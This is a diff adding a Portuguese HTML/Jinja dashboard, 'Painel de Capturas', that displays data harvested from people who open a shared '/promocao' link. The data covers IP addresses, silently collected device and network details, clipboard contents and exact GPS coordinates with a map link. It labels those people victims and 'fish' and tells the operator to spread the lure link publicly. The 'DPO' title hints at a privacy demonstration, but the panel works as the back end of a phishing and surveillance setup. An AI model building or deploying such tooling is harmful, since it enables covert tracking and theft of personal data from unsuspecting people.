@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>Painel de Capturas - DPO</title>
+    <meta http-equiv="refresh" content="3"> <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body { background-color: #121212; color: #e0e0e0; font-family: monospace; }
+        .card-silenciosa { border-left: 5px solid #0dcaf0; background-color: #1e1e1e; }
+        .card-permissao { border-left: 5px solid #dc3545; background-color: #2b1113; }
+        .highlight { color: #0dcaf0; font-weight: bold; }
+        .danger-text { color: #ff4d4d; font-weight: bold; }
+    </style>
+</head>
+<body class="p-4">
+
+    <div class="d-flex justify-content-between align-items-center mb-4 border-bottom border-secondary pb-3">
+        <h1>🛡️ Painel de Monitoramento (Tempo Real)</h1>
+        <span class="badge bg-secondary fs-5">Total de Eventos: {{ capturas|length }}</span>
+    </div>
+
+    <div class="row g-3">
+        {% for cap in capturas %}
+            <div class="col-md-6 col-lg-4">
+                <div class="card h-100 shadow-sm {% if cap.tipo_alerta == 'Coleta Silenciosa' %}card-silenciosa{% else %}card-permissao{% endif %} text-light">
+                    <div class="card-body">
+                        <h5 class="card-title border-bottom border-secondary pb-2">
+                            {{ cap.icone }} <span class="float-end fs-6 text-muted">{{ cap.horario }}</span>
+                        </h5>
+                        <p class="mb-1"><strong>IP:</strong> {{ cap.ip }}</p>
+                        
+                        {% if cap.tipo_alerta == 'Coleta Silenciosa' %}
+                            <p class="text-info mb-2 mt-3"><small>🕵️ Coleta Silenciosa de Hardware/Rede</small></p>
+                            <ul class="list-unstyled small">
+                                <li><strong>CPU:</strong> {{ cap.dados_tecnicos.cpuCores }} núcleos</li>
+                                <li><strong>RAM Est.:</strong> {{ cap.dados_tecnicos.memoriaRam }}</li>
+                                <li><strong>Bateria:</strong> {{ cap.dados_tecnicos.bateria }} (Carregando: {{ cap.dados_tecnicos.carregando }})</li>
+                                <li><strong>Tela:</strong> {{ cap.dados_tecnicos.resolucao }}</li>
+                                <li><strong>Conexão:</strong> <span class="highlight">{{ cap.dados_tecnicos.conexaoTipo }} ({{ cap.dados_tecnicos.conexaoVelocidade }})</span></li>
+                            </ul>
+                        {% endif %}
+
+                        {% if cap.tipo_alerta == 'Coleta por Permissão' %}
+                            <p class="text-danger mb-2 mt-3"><small>🚨 Permissão Concedida pela Vítima</small></p>
+                            <ul class="list-unstyled small">
+                                {% if cap.dados_tecnicos.clipboard %}
+                                    <li class="mb-2"><strong>📋 Área de Transferência:</strong><br>
+                                    <div class="p-2 bg-dark rounded text-break danger-text mt-1">"{{ cap.dados_tecnicos.clipboard }}"</div></li>
+                                {% endif %}
+                                
+                                {% if cap.dados_tecnicos.latitude %}
+                                    <li><strong>📍 Localização Exata:</strong><br>
+                                    Lat: {{ cap.dados_tecnicos.latitude }}<br>Lon: {{ cap.dados_tecnicos.longitude }}<br>
+                                    <a href="https://www.google.com/maps?q={{ cap.dados_tecnicos.latitude }},{{ cap.dados_tecnicos.longitude }}" target="_blank" class="btn btn-sm btn-outline-danger mt-2">Abrir no Google Maps</a>
+                                    </li>
+                                {% endif %}
+                            </ul>
+                        {% endif %}
+                    </div>
+                </div>
+            </div>
+        {% else %}
+            <div class="col-12 text-center text-muted mt-5">
+                <h3>A rede está vazia. Aguardando os primeiros "peixes"... 🎣</h3>
+                <p>Compartilhe o link /promocao com o público.</p>
+            </div>
+        {% endfor %}
+    </div>
+
+</body>
+</html>
